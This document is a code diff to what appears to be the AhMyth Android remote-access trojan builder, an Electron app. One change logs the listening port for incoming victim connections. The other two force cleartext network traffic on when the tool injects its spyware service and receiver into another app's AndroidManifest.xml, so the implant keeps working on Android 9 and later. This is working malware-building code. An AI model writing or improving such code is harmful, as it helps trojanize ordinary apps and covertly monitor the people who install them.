@@ -60,10 +60,15 @@ app.controller("AppCtrl", ($scope) => {
     });
 
 
-    // fired if listening brings error
-    ipcRenderer.on("SocketIO:Listen", (event, error) => {
-        $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
-        $appCtrl.isListen = false;
+    // fired if listening brings response (success port or error message)
+    ipcRenderer.on("SocketIO:Listen", (event, response) => {
+        if (!isNaN(response)) {
+            $appCtrl.Log("Listening on port => " + response, CONSTANTS.logStatus.SUCCESS);
+            $appCtrl.isListen = true;
+        } else {
+            $appCtrl.Log(response, CONSTANTS.logStatus.FAIL);
+            $appCtrl.isListen = false;
+        }
         $appCtrl.$apply()
     });
 
@@ -207,6 +212,12 @@ app.controller("AppCtrl", ($scope) => {
             var ahmythReciver = CONSTANTS.ahmythReciver;
             $appCtrl.Log('Modifying AndroidManifest.xml...');
             var permManifest = $appCtrl.copyPermissions(data);
+
+            // AUTO-FIX: Enable cleartext traffic for Android 9+ compatibility
+            if (permManifest.indexOf('android:usesCleartextTraffic') == -1) {
+                permManifest = permManifest.replace('<application', '<application android:usesCleartextTraffic="true"');
+            }
+
             var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + ahmythReciver + permManifest.substring(permManifest.indexOf("</application>"));
             fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
                 if (error) {
@@ -246,6 +257,12 @@ app.controller("AppCtrl", ($scope) => {
             var ahmythService = CONSTANTS.ahmythService;
             $appCtrl.Log('Modifying AndroidManifest.xml...');
             var permManifest = $appCtrl.copyPermissions(data);
+
+            // AUTO-FIX: Enable cleartext traffic for Android 9+ compatibility
+            if (permManifest.indexOf('android:usesCleartextTraffic') == -1) {
+                permManifest = permManifest.replace('<application', '<application android:usesCleartextTraffic="true"');
+            }
+
             var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + permManifest.substring(permManifest.indexOf("</application>"));
             fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
                 if (error) {
